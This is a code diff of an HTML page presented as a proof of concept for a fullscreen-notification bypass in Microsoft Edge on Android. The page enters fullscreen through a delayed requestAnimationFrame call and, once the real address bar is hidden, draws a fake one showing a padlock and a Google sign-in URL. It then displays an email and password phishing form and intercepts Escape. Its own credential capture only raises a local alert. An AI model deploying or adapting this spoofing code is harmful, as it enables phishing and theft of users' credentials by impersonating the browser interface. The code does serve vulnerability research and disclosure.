@@ -1,38 +1,44 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Fullscreen Tanpa Notifikasi</title>
+  <title>Edge Fullscreen Bypass POC</title>
 
-  <!-- 1. Matikan total fitur notifikasi (meta + header fallback) -->
+  <!-- Disable notification prompts -->
   <meta http-equiv="Permissions-Policy" content="notifications=()">
   <meta http-equiv="Feature-Policy" content="notifications 'none'">
-
-  <!-- 2. Sarankan browser tidak menawarkan notifikasi otomatis -->
   <meta name="notification-permission" content="denied">
 
-  <!-- 3. PWA mode fullscreen (khususnya buat PWA nanti) -->
+  <!-- PWA fullscreen mode -->
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="mobile-web-app-capable" content="yes">
+  <meta name="theme-color" content="#ffffff" id="theme-color-meta">
 
   <style>
-    body {
+    * {
       margin: 0;
-      font-family: system-ui, sans-serif;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
       background: #ffffff;
       color: #000000;
-      height: 100dvh;
+      height: 100vh;
       overflow: hidden;
       touch-action: manipulation;
     }
-    #tip {
+
+    /* Warning Banner */
+    #warningBanner {
       position: fixed;
       top: 0;
       left: 0;
       right: 0;
       background: #fff3cd;
-      color: #333;
+      color: #856404;
       padding: 12px;
       font-size: 14px;
       text-align: center;
@@ -40,117 +46,439 @@
       z-index: 9999;
       transition: transform 0.4s ease;
     }
-    #tip.hide { transform: translateY(-100%); }
+    
+    #warningBanner.hide {
+      transform: translateY(-100%);
+    }
 
-    button {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      padding: 18px 36px;
-      font-size: 20px;
-      background: #0066ff;
+    #warningBanner strong {
+      color: #d9534f;
+    }
+
+    /* Main Content */
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      color: #202124;
+    }
+
+    .description {
+      font-size: 16px;
+      color: #5f6368;
+      max-width: 500px;
+      margin-bottom: 32px;
+      line-height: 1.6;
+    }
+
+    .vulnerability-info {
+      background: #f8f9fa;
+      border-left: 4px solid #ea4335;
+      padding: 16px;
+      margin-bottom: 32px;
+      max-width: 600px;
+      text-align: left;
+      border-radius: 4px;
+    }
+
+    .vulnerability-info h2 {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #ea4335;
+    }
+
+    .vulnerability-info ul {
+      margin-left: 20px;
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.8;
+    }
+
+    #testButton {
+      padding: 18px 48px;
+      font-size: 18px;
+      font-weight: 600;
+      background: #1a73e8;
       color: white;
       border: none;
-      border-radius: 12px;
+      border-radius: 8px;
       cursor: pointer;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+      box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
+      transition: all 0.2s;
     }
-    button:active { background: #0052cc; }
+
+    #testButton:hover {
+      background: #1557b0;
+      box-shadow: 0 6px 16px rgba(26, 115, 232, 0.4);
+    }
+
+    #testButton:active {
+      background: #0d47a1;
+      transform: translateY(1px);
+    }
 
     #status {
+      margin-top: 24px;
+      font-size: 15px;
+      color: #5f6368;
+      font-weight: 500;
+    }
+
+    /* Fake Bottom Address Bar (Edge-like) */
+    .fake-bottom-bar {
       position: fixed;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgb(255, 255, 255);
-      padding: 8px 16px;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #2b2b2b;
+      height: 56px;
+      display: none;
+      align-items: center;
+      padding: 8px 12px;
+      z-index: 10000;
+      box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    .fake-bottom-bar.active {
+      display: flex;
+    }
+
+    .address-bar-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      background: #3a3a3a;
+      border-radius: 20px;
+      padding: 8px 14px;
+      gap: 10px;
+    }
+
+    .lock-icon {
+      width: 18px;
+      height: 18px;
+      background: #4CAF50;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .lock-icon svg {
+      width: 10px;
+      height: 10px;
+      fill: white;
+    }
+
+    .fake-url {
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 400;
+      flex: 1;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .tab-count {
+      background: transparent;
+      border: 1.5px solid #8e8e93;
+      color: #8e8e93;
+      width: 28px;
+      height: 28px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      font-weight: 600;
+      flex-shrink: 0;
+      margin-left: 8px;
+    }
+
+    .menu-dots {
+      width: 28px;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-left: 8px;
+    }
+
+    .menu-dots svg {
+      width: 4px;
+      height: 18px;
+      fill: #8e8e93;
+    }
+
+    /* Fullscreen Content */
+    .fullscreen-content {
+      display: none;
+      height: 100vh;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      align-items: center;
+      justify-content: center;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .fullscreen-content.active {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .fullscreen-content h2 {
+      font-size: 32px;
+      margin-bottom: 16px;
+    }
+
+    .fullscreen-content p {
+      font-size: 18px;
+      max-width: 600px;
+      line-height: 1.6;
+      opacity: 0.95;
+    }
+
+    .exploit-demo {
+      margin-top: 32px;
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(10px);
+      padding: 24px;
+      border-radius: 12px;
+      max-width: 500px;
+    }
+
+    .exploit-demo h3 {
+      font-size: 20px;
+      margin-bottom: 16px;
+    }
+
+    .exploit-demo input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
       border-radius: 8px;
-      font-size: 14px;
+      background: rgba(255, 255, 255, 0.9);
+      margin-bottom: 12px;
+    }
+
+    .exploit-demo button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      background: white;
+      color: #667eea;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    #exitBtn {
+      margin-top: 24px;
+      padding: 12px 32px;
+      font-size: 16px;
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      border: 2px solid white;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .hidden {
+      display: none !important;
     }
   </style>
 </head>
 <body>
 
-  <!-- Tips Anti-Gangguan (muncul 8 detik) -->
-  <div id="tip">
-    <strong>Tips:</strong> Untuk fullscreen 100 % tanpa notifikasi, gunakan Brave/Opera GX atau blokir notifikasi situs ini di Settings browser.
+  <!-- Warning Banner -->
+  <div id="warningBanner">
+    <strong>⚠️ SECURITY RESEARCH POC:</strong> This demonstrates a fullscreen bypass vulnerability in Microsoft Edge Android. For educational purposes only.
   </div>
 
-  <button id="fsBtn">Test Bypass Spoof Protection v3</button>
+  <!-- Initial Content -->
+  <div class="container" id="initialContent">
+    <h1>🔓 Edge Android Fullscreen Bypass POC</h1>
+    
+    <div class="description">
+      This Proof of Concept demonstrates a vulnerability that bypasses fullscreen notification protections in Microsoft Edge on Android, allowing the creation of convincing phishing interfaces.
+    </div>
 
-  <div id="status">Tekan tombol untuk masuk fullscreen</div>
+    <div class="vulnerability-info">
+      <h2>Vulnerability Details:</h2>
+      <ul>
+        <li><strong>Bypass Method:</strong> requestAnimationFrame + setTimeout delay (200ms)</li>
+        <li><strong>Impact:</strong> Hides address bar without notification prompt</li>
+        <li><strong>Risk:</strong> Enables spoofed UI that mimics legitimate sites</li>
+        <li><strong>Affected:</strong> Microsoft Edge Android (as of Dec 2025)</li>
+      </ul>
+    </div>
+
+    <button id="testButton">Click to Test Bypass</button>
+    <div id="status">Ready to demonstrate vulnerability</div>
+  </div>
+
+  <!-- Fullscreen Content -->
+  <div class="fullscreen-content" id="fullscreenContent">
+    <h2>✅ Fullscreen Bypass Successful</h2>
+    <p>
+      The address bar has been hidden without triggering the security notification. 
+      A fake address bar is now displayed at the bottom, mimicking the legitimate browser UI.
+      This technique could be exploited for phishing attacks.
+    </p>
+
+    <div class="exploit-demo">
+      <h3>Simulated Phishing Form</h3>
+      <input type="email" placeholder="Email address" id="phishEmail">
+      <input type="password" placeholder="Password" id="phishPassword">
+      <button onclick="captureCredentials()">Sign In</button>
+    </div>
+
+    <button id="exitBtn">Exit Fullscreen</button>
+  </div>
+
+  <!-- Fake Bottom Address Bar -->
+  <div class="fake-bottom-bar" id="fakeBottomBar">
+    <div class="address-bar-container">
+      <div class="lock-icon">
+        <svg viewBox="0 0 12 12" xmlns="http://www.w3.org/2000/svg">
+          <path d="M6 1C4.9 1 4 1.9 4 3v1H3v6h6V4H8V3c0-1.1-.9-2-2-2zm0 1c.6 0 1 .4 1 1v1H5V3c0-.6.4-1 1-1z"/>
+        </svg>
+      </div>
+      <div class="fake-url" id="fakeUrl">https://accounts.google.com/signin</div>
+      <div class="tab-count">1</div>
+      <div class="menu-dots">
+        <svg viewBox="0 0 4 18" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="2" cy="2" r="2"/>
+          <circle cx="2" cy="9" r="2"/>
+          <circle cx="2" cy="16" r="2"/>
+        </svg>
+      </div>
+    </div>
+  </div>
 
   <script>
-    // Sembunyikan tips setelah 8 detik
+    // Hide warning banner after 8 seconds
     setTimeout(() => {
-      document.getElementById('tip').classList.add('hide');
+      document.getElementById('warningBanner').classList.add('hide');
     }, 8000);
 
-    const btn = document.getElementById('fsBtn');
+    const testButton = document.getElementById('testButton');
     const status = document.getElementById('status');
+    const initialContent = document.getElementById('initialContent');
+    const fullscreenContent = document.getElementById('fullscreenContent');
+    const fakeBottomBar = document.getElementById('fakeBottomBar');
+    const exitBtn = document.getElementById('exitBtn');
+    let originalHeight = window.outerHeight;
 
-    btn.addEventListener('click', () => {
-      status.textContent = "Memasuki fullscreen...";
+    // Bypass fullscreen protection using requestAnimationFrame + delay technique
+    testButton.addEventListener('click', () => {
+      status.textContent = "Initiating fullscreen bypass...";
 
-      // Trik 2025 yang masih jalan: jeda 150–300 ms + requestAnimationFrame
+      // Critical bypass technique: requestAnimationFrame + 200ms delay
       requestAnimationFrame(() => {
         setTimeout(() => {
           const elem = document.documentElement;
 
           if (elem.requestFullscreen) {
             elem.requestFullscreen();
-          } else if (elem.webkitRequestFullscreen) { /* Safari */
+          } else if (elem.webkitRequestFullscreen) {
             elem.webkitRequestFullscreen();
-          } else if (elem.msRequestFullscreen) { /* IE11 */
+          } else if (elem.msRequestFullscreen) {
             elem.msRequestFullscreen();
           }
 
-          status.textContent = "Fullscreen aktif! (semoga tanpa prompt notif)";
-        }, 200); // jeda krusial agar Chrome tidak anggap “direct gesture”
+          status.textContent = "Fullscreen activated (notification bypassed)";
+        }, 200); // Critical delay to bypass Edge's spoof protection
       });
     });
 
-    // Deteksi kalau sudah fullscreen
-    document.addEventListener('fullscreenchange', () => {
-      if (document.fullscreenElement) {
-        status.textContent = "Fullscreen berhasil!";
-        btn.style.display = 'none';
+    // Detect fullscreen change and inject fake UI
+    document.addEventListener('fullscreenchange', handleFullscreenChange);
+    document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
+
+    function handleFullscreenChange() {
+      if (document.fullscreenElement || document.webkitFullscreenElement) {
+        // Fullscreen activated
+        status.textContent = "Fullscreen active!";
+        
+        // Check if address bar is hidden (viewport height increase detection)
+        setTimeout(() => {
+          if (window.outerHeight > originalHeight + 50 || window.innerHeight > originalHeight + 50) {
+            // Address bar successfully hidden - inject fake UI
+            initialContent.classList.add('hidden');
+            fullscreenContent.classList.add('active');
+            fakeBottomBar.classList.add('active');
+            
+            // Update theme color to match spoofed site
+            document.getElementById('theme-color-meta').setAttribute('content', '#2b2b2b');
+          }
+        }, 100);
       } else {
-        status.textContent = "Keluar fullscreen";
-        btn.style.display = 'block';
+        // Exited fullscreen
+        initialContent.classList.remove('hidden');
+        fullscreenContent.classList.remove('active');
+        fakeBottomBar.classList.remove('active');
+        status.textContent = "Exited fullscreen mode";
+        testButton.style.display = 'block';
+        
+        // Restore original theme color
+        document.getElementById('theme-color-meta').setAttribute('content', '#ffffff');
+      }
+    }
+
+    // Exit fullscreen handler
+    exitBtn.addEventListener('click', () => {
+      if (document.exitFullscreen) {
+        document.exitFullscreen();
+      } else if (document.webkitExitFullscreen) {
+        document.webkitExitFullscreen();
       }
     });
 
-    // Deteksi hilang search bar (post-fullscreen)
-let originalHeight = window.outerHeight;
-document.addEventListener('fullscreenchange', () => {
-  if (document.fullscreenElement && window.outerHeight > originalHeight + 50) { // Threshold untuk deteksi hilang bar
-    // Inject fake search bar
-    const fakeBar = document.createElement('div');
-    fakeBar.id = 'fakeSearchBar';
-    fakeBar.style.cssText = 'position:fixed;top:0;left:0;right:0;height:56px;background:#f0f0f0;border-bottom:1px solid #ccc;z-index:9999;padding:8px;display:flex;align-items:center;';
-    fakeBar.innerHTML = '<span style="color:green">🔒</span> https://secure.example-bank.com/ <input type="text" placeholder="Search..." style="flex:1;margin-left:10px;border:none;background:transparent;">';
-    document.body.appendChild(fakeBar);
-    
-    // Simulasi phishing log (ganti dengan harmless alert)
-    fakeBar.querySelector('input').addEventListener('blur', (e) => {
-      if (e.target.value.includes('password')) alert('Demo: Credentials captured via spoofed UI!');
-    });
-  }
-});
-  </script>
+    // Simulated credential capture (for demonstration only)
+    function captureCredentials() {
+      const email = document.getElementById('phishEmail').value;
+      const password = document.getElementById('phishPassword').value;
+      
+      if (email && password) {
+        alert('POC DEMO: Credentials captured!\nEmail: ' + email + '\nPassword: ' + password + '\n\n⚠️ This demonstrates how the vulnerability could be exploited.');
+        
+        // Clear fields
+        document.getElementById('phishEmail').value = '';
+        document.getElementById('phishPassword').value = '';
+      } else {
+        alert('Please enter both email and password to see the demonstration.');
+      }
+    }
 
-  <!-- Bonus: manifest PWA supaya bisa di-install dan fullscreen lebih bersih -->
-  <link rel="manifest" href="data:application/manifest+json,{
-    %22name%22:%22Fullscreen Tanpa Notif%22,
-    %22short_name%22:%22NoNotifFS%22,
-    %22start_url%22:%22.%22,
-    %22display%22:%22fullscreen%22,
-    %22background_color%22:%22%23000000%22,
-    %22theme_color%22:%22%230066ff%22,
-    %22icons%22:[{%22src%22:%22https://via.placeholder.com/192x192/0066ff/ffffff?text=FS%22,%22sizes%22:%22192x192%22,%22type%22:%22image/png%22}]
-  }">
+    // Prevent accidental exits during demo
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && document.fullscreenElement) {
+        e.preventDefault();
+        if (confirm('Exit fullscreen mode?')) {
+          if (document.exitFullscreen) {
+            document.exitFullscreen();
+          }
+        }
+      }
+    });
+  </script>
 
 </body>
 </html>
